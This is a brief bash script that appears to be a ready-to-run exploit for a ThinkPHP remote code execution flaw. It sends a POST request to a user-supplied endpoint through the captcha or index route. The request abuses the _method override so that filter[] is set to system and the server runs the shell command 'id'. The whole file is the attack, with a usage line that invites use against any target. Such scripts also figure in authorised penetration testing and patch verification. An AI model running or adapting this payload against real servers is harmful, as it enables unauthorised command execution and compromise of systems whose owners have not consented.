#!/bin/bash
# ThinkPHP — _method override RCE via captcha route or index
# Usage: method_override_rce.sh <ENDPOINT> [route]
set -euo pipefail

ENDPOINT="${1:?Usage: $0 <ENDPOINT> [route]}"
ROUTE="${2:-captcha}"

curl -s -X POST "${ENDPOINT}/index.php?s=${ROUTE}" \
  -d "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id" \
  --max-time 10
